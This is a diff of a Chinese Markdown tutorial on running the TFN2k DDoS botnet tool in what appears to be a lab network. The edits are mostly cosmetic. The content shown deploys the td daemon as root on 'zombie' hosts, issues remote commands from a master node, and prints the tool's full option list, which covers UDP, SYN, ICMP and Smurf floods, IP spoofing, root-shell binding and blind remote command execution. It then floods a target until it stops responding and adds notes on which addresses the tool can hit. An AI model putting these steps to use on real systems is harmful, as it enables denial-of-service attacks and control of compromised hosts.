@@ -33,13 +33,17 @@ TFN2k 模拟攻击示例
 >10.4.3.145指挥10.4.192.26,10.4.3.117,10.4.3.145去攻击10.4.192.25
 
 ##主控端安装
+
 >将td,tfn两程序FTP到主控端（10.4.3.145）的/root
->`[root@localhost ~]# ls`
+
+>`# ls`
+
 >`serverout0.txt  tfn  td`
+
 
 ##建立host_tfn文件，设立肉鸡地址，包括自身
 
->[root@localhost ~]# cat host_tfn
+># cat  host_tfn
 
 >10.4.192.26     
 
@@ -56,13 +60,13 @@ TFN2k 模拟攻击示例
 
 ##各被控端起td
 
->[mac@nm ~]$ su                 td必须在root下起
+>[td@some ~]$ su                 td必须在root下起
 
 >Password:
 
->[root@nm mac]# ./td
+>[td@some ]# ./td
 
->[root@nm mac]# ps -ef
+>[td@some ]# ps -ef
 
 >UID        PID  PPID  C STIME TTY          TIME CMD
 
@@ -76,7 +80,7 @@ TFN2k 模拟攻击示例
 
 
 
-##在主控host也要起肉鸡程序td (即主控端自身也是肉鸡)
+## 在主控host也要起肉鸡程序td (即主控端自身也是肉鸡)
 
 >telnet 10.4.3.145
 
@@ -86,7 +90,7 @@ TFN2k 模拟攻击示例
 
 >在主控端做基本的控制测试
 
->`[root@localhost ~]# /root/tfn -f host_tfn -c 10 -i "mkdir testaa"`
+>`# /root/tfn -f host_tfn -c 10 -i "mkdir testaa"`
 
 >Protocol      : random
 
@@ -100,14 +104,14 @@ TFN2k 模拟攻击示例
 
 >Sending out packets: ...
 
->[root@localhost ~]#
+>#
 
 
 ##在各个肉鸡下都会自动建立一个目录testaa,通常建立在td文件存在的目录下
 
->`[root@localhost ~]# ls`
+>`# ls`
 
->`host_tfn    td      tfn`
+>`host_tfn  td   tfn  tastaa`
 
 >这证明主控和肉鸡通信正常
 
@@ -117,58 +121,62 @@ TFN2k 模拟攻击示例
 ##在主控端执行tfn
 
 
->[root@localhost ~]# /root/tfn
+># /root/tfn
 
->usage: /root/tfn <options>
+> usage: /root/tfn <options>
 
->[-P protocol]   Protocol for server communication. Can be ICMP, UDP or TCP.
+> [-P protocol]   Protocol for server communication. Can be ICMP, UDP or TCP.
 
->Uses a random protocol as default
+> Uses a random protocol as default
 
->[-D n]          Send out n bogus requests for each real one to decoy targets
+> [-D n]          Send out n bogus requests for each real one to decoy targets
 
->[-S host/ip]    Specify your source IP. Randomly spoofed by default, you need
+> [-S host/ip]    Specify your source IP. Randomly spoofed by default, you need
 
->to use your real IP if you are behind spoof-filtering routers
+> to use your real IP if you are behind spoof-filtering routers
 
->[-f hostlist]   Filename containing a list of hosts with TFN servers to contact
+> [-f hostlist]   Filename containing a list of hosts with TFN servers to contact
 
->[-h hostname]   To contact only a single host running a TFN server
+> [-h hostname]   To contact only a single host running a TFN server
 
->[-i target string]      Contains options/targets separated by '@', see below
+> [-i target string]      Contains options/targets separated by '@', see below
 
->[-p port]               A TCP destination port can be specified for SYN floods
+> [-p port]               A TCP destination port can be specified for SYN floods
 
-><-c command ID> 0 - Halt all current floods on server(s) immediately
+> <-c command ID> 0 - Halt all current floods on server(s) immediately
 
->1 - Change IP antispoof-level (evade rfc2267 filtering)
+> 1 - Change IP antispoof-level (evade rfc2267 filtering)
 
 >    usage: -i 0 (fully spoofed) to -i 3 (/24 host bytes spoofed)
 
->2 - Change Packet size, usage: -i <packet size in bytes>
+> 2 - Change Packet size, usage: -i <packet size in bytes>
 
->3 - Bind root shell to a port, usage: -i <remote port>
+> 3 - Bind root shell to a port, usage: -i <remote port>
 
->4 - UDP flood, usage: -i victim@victim2@victim3@...
+> 4 - UDP flood, usage: -i victim@victim2@victim3@...
 
->5 - TCP/SYN flood, usage: -i victim@... [-p destination port]
+> 5 - TCP/SYN flood, usage: -i victim@... [-p destination port]
 
->6 - ICMP/PING flood, usage: -i victim@...
+> 6 - ICMP/PING flood, usage: -i victim@...
 
->7 - ICMP/SMURF flood, usage: -i victim@broadcast@broadcast2@...
+> 7 - ICMP/SMURF flood, usage: -i victim@broadcast@broadcast2@...
 
->8 - MIX flood (UDP/TCP/ICMP interchanged), usage: -i victim@...
+> 8 - MIX flood (UDP/TCP/ICMP interchanged), usage: -i victim@...
 
->9 - TARGA3 flood (IP stack penetration), usage: -i victim@...
+> 9 - TARGA3 flood (IP stack penetration), usage: -i victim@...
 
->10 - Blindly execute remote shell command, usage -i command
+> 10 - Blindly execute remote shell command, usage -i command
 
 
->-c 10是执行一条指令
+### tips 
 
->-c 4,5,6,7,8,9 是5种DOS攻击
+> -c 10是执行一条指令
 
->-c 0 是关闭攻击
+> -c 4,5,6,7,8,9 是5种DOS攻击
+
+> -c 0 是关闭攻击
+
+
 
 
 ## example:
@@ -205,7 +213,7 @@ TFN2k 模拟攻击示例
 
 ## 关闭攻击
 
-> [root@localhost ~]# /root/tfn -f host_tfn -c 0
+> # /root/tfn -f host_tfn -c 0
 
 > Protocol      : random
 
@@ -222,7 +230,7 @@ TFN2k 模拟攻击示例
  
 ### 关闭攻击后，被攻击主机有可能会恢复通信，也有可能仍不能通信（必须重起），即被“攻死了”
 
-> [root@localhost ~]# ping 10.4.192.25
+> # ping 10.4.192.25
 
 > PING 10.4.192.25 (10.4.192.25) 56(84) bytes of data.
 
@@ -243,7 +251,7 @@ TFN2k 模拟攻击示例
 
 > 10 packets transmitted, 0 received, +6 errors, 100% packet loss, time 8998ms
  
-> [root@localhost ~]# ping 10.4.192.25
+> # ping 10.4.192.25
 
 > PING 10.4.192.25 (10.4.192.25) 56(84) bytes of data.
 
@@ -255,7 +263,15 @@ TFN2k 模拟攻击示例
 
  
  
-## TFN发动的攻击包括：UDPflood（-c 6)、TCP SYN flood(-c 5) 、ICMPreply flood(-c 7)
+## TFN发动的攻击包括：
+
+* UDPflood（-c 6)
+
+* TCP SYN flood(-c 5) 
+
+* ICMPreply flood(-c 7)
+
+
  
 ### SYN/TCP攻击并设攻击端口（假设对方是WWW SERVER）
 
@@ -273,7 +289,7 @@ TFN2k 模拟攻击示例
   
 > tfn 只能对IP地址前两个数字至少有一个>100的地址发攻击，即tfn无法攻击10.1.1.1 这是反复实验得来的。
 
-> 一开始发现在192地址下发起攻击有效，但在10的地址下发起攻击无效，
+> 一开始发现在192地址下发起攻击有效，但在10的地址下发起攻击无效.
  
  
 [1]: http://blog.sina.com.cn/s/blog_6151984a0100exma.html
